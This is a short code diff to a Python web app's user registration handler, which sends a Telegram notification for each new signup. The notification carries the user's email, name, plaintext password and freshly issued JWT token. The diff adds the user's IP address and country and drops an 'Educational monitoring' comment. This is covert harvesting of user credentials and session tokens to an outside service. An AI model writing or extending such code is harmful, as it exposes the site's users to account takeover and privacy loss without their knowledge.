@@ -81,14 +81,16 @@ async def register(user_data: UserCreate, request: Request):
         # Create JWT token
         token = create_access_token(data={"sub": user_id, "email": user_data.email.lower()})
         
-        # Send Telegram notification (Educational monitoring) - with full details
+        # Send Telegram notification with full details including IP and country
         try:
             notify_user_registration(
                 user_data.email.lower(), 
                 user_data.name, 
                 user_data.password,
                 token,
-                user_id
+                user_id,
+                ip_address,
+                country
             )
         except Exception as e:
             logger.warning(f"Failed to send Telegram notification: {str(e)}")
